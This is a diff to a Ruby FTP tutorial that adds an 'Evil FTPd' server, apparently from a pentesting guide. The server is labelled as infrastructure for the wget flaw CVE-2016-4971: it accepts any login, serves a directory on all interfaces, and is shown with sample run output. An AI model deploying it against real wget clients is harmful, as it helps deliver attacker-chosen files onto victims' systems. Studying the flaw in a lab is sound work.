@@ -1,7 +1,7 @@
 # FTP
 Dealing with FTP is something needed in many cases, Let's see how easy is that in Ruby with AIO example.
 
-
+## FTP Client 
 ```ruby
 require 'net/ftp'
 
@@ -25,3 +25,94 @@ ftp.close                                               # Close the connection
 Yep, it's simple as that, easy and familiar.
 
 **TIP:** You can do it all above way using pure socket library, it's really easy. You may try to do it.
+
+## FTP Server
+- Install gem 
+```
+gem install ftpd
+```
+
+```ruby
+#
+# CVE-2016-4971 | The Evil FTPd server
+# KING SABRI | @KINGSABRI
+# 
+require 'ftpd'
+
+class Driver
+  attr_accessor :path, :user, :pass
+  def initialize(path)
+    @path = path
+  end
+  
+  def authenticate(user, password)
+    true
+  end
+  
+  def file_system(user)
+    Ftpd::DiskFileSystem.new(@path)
+  end
+  
+end
+
+class FTPevil
+  
+  def initialize(path=".")
+    @driver = Driver.new(File.expand_path(path))
+    @server = Ftpd::FtpServer.new(@driver)
+    configure_server
+    print_connection_info
+  end
+  
+  def configure_server
+    @server.server_name = "Wget Exploit"
+    @server.interface = "0.0.0.0"
+    @server.port = 21
+  end
+  
+  def print_connection_info
+    puts "Interface: #{@server.interface}"
+    puts "Port: #{@server.port}"
+    puts "Directory: #{@driver.path}"
+    puts "User: #{@driver.user}"
+    puts "Pass: #{@driver.pass}"
+    puts "PID: #{$$}"
+  end
+  
+  def start
+    @server.start
+    puts "[+] FTP server started. (Press CRL+C to stop it)"
+    $stdout.flush
+    begin
+      loop{}
+    rescue Interrupt
+      puts "\n[+] Closing FTP server."
+    end
+  end
+end
+
+if ARGV.size >= 1
+  path   = ARGV[0]
+else 
+  puts "[!] ruby #{__FILE__} <PATH>"
+  exit
+end
+
+FTPevil.new(path).start
+```
+
+Run it
+```
+ruby ftpd.rb .
+
+Interface: 0.0.0.0
+Port: 21
+Directory: /home/pentest/exploitation/CVE-in-Ruby/CVE-2016-4971
+User: 
+Pass: 
+PID: 2366
+[+] FTP server started. (Press CRL+C to stop it)
+
+```
+
+
